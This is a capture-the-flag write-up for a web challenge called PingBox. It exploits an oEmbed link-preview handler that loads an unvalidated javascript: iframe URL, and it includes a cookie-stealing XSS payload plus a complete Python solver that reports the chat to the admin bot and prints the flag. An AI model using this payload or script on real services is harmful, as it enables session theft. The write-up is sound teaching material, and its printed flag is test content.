---
title: "PingBox"
date: 2026-08-22
description: 'Exploiting an unsafe oEmbed iframe URL to capture the admin session.'
category: '$n1phers-3-0-ctf'
discipline: 'web-exploit'
authors: ['abdieeuh']
draft: false
---

# PingBox

## Summary

PingBox creates link previews by following URLs and processing oEmbed discovery
documents. Its client-side preview handler trusts the oEmbed `iframe_url` and
allows a `javascript:` URL to be placed in a newly created iframe. The admin
bot visits reported chats, so the payload can read the admin page's
non-HttpOnly cookies and submit them back into the reported chat.

This is an unsafe same-origin JavaScript/XSS primitive rather than a pure
XS-Leak side channel. The [OWASP XS-Leaks Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html)
was useful for classifying the behavior.

## Solution

### 1. Identify the preview sink

Normal messages are HTML-escaped, so direct message or title injection does
not work. However, `/unfurl.js` contains the relevant behavior:

```javascript
var src = el.getAttribute('data-iframe-url') || el.getAttribute('data-html-src');
var iframe = document.createElement('iframe');
iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin');
el.replaceWith(iframe);
iframe.setAttribute('src', src);
```

There is no scheme validation before assigning `src`. The server also accepts
oEmbed discovery from an arbitrary final page, not only from a fixed provider.

### 2. Build a deterministic oEmbed response

[EchoServer](https://echoserver.dev/) was used as a URL-defined response
server. The solver creates an HTML response containing an oEmbed discovery
link, and a scalar JSON response containing:

```json
{"type":"rich","provider_url":"x","iframe_url":"javascript:d=parent.document;f=d.forms[0];f[0].value=d.cookie;f.submit()"}
```

The resulting PingBox page contained the verified sink:

```html
data-iframe-url="javascript:d=parent.document;f=d.forms[0];f[0].value=d.cookie;f.submit()"
```

The payload uses the existing chat form, so it does not need to guess a chat
ID or make an external exfiltration request. When the admin opens the chat and
clicks the preview, the form submits `document.cookie` as a new message.

### 3. Report the chat and recover the flag

The chat was submitted to `POST /report`. The application returned:

```text
Thanks - your report has been queued for review.
```

Polling the same public chat then produced:

```text
flag=$N1PH€RSxTCTF{3sc4p1ng_S4ndB0x_15_M4d3_3z!!}
```

The following script reproduces the full flow. It uses the server-returned chat
location, so it does not use randomness or brute force.

```python
#!/usr/bin/env python3
import html
import re
import subprocess
import tempfile
import time

import requests


TARGET = "http://13.203.69.239:31007"
LZSTRING_URL = "https://echoserver.dev/lz-string.min.js"
PAYLOAD = (
    "javascript:d=parent.document;f=d.forms[0];"
    "f[0].value=d.cookie;f.submit()"
)


def build_oembed_url(lz_path):
    node_code = r'''
const fs = require("fs");
const vm = require("vm");
const context = { module: { exports: {} }, exports: {} };
vm.runInNewContext(fs.readFileSync(process.argv[2], "utf8"), context);
const LZ = context.module.exports;
const payload = process.argv[3];

const oembed = JSON.stringify({
  type: "rich",
  provider_url: "x",
  iframe_url: payload
});
const query = encodeURIComponent(JSON.stringify({
  headers: [["Content-Type", "application/json"]],
  body: { type: "text", data: oembed }
}));
const page = `<link type=application/json+oembed href=?query=${query}>`;
const response = {
  headers: [["Content-Type", "text/html"]],
  body: { type: "text", data: page }
};

console.log(
  "https://echoserver.dev/server?response=" +
  LZ.compressToEncodedURIComponent(JSON.stringify(response))
);
'''
    result = subprocess.run(
        ["node", "-", lz_path, PAYLOAD],
        input=node_code,
        text=True,
        capture_output=True,
        check=True,
    )
    return result.stdout.strip()


def main():
    session = requests.Session()

    created = session.post(
        f"{TARGET}/chat",
        data={"title": "admin-cookie-capture"},
        allow_redirects=False,
        timeout=20,
    )
    created.raise_for_status()
    chat = TARGET + created.headers["Location"]

    lz = session.get(LZSTRING_URL, timeout=20)
    lz.raise_for_status()
    with tempfile.NamedTemporaryFile("w", suffix=".js") as handle:
        handle.write(lz.text)
        handle.flush()
        exploit_url = build_oembed_url(handle.name)

    assert len(exploit_url) <= 500
    posted = session.post(
        f"{chat}/message",
        data={"text": exploit_url},
        timeout=20,
    )
    posted.raise_for_status()

    report = session.post(
        f"{TARGET}/report",
        data={"url": chat},
        timeout=20,
    )
    report.raise_for_status()

    for _ in range(30):
        page = session.get(chat, timeout=20).text
        messages = [
            html.unescape(value)
            for value in re.findall(r'<div class="text">(.*?)</div>', page, re.S)
        ]
        for message in messages:
            if message.startswith("flag="):
                print(message)
                return
        time.sleep(2)

    raise RuntimeError("The admin bot did not return a flag before timeout")


if __name__ == "__main__":
    main()
```

## Flag

```text
$N1PH€RSxTCTF{3sc4p1ng_S4ndB0x_15_M4d3_3z!!}
```
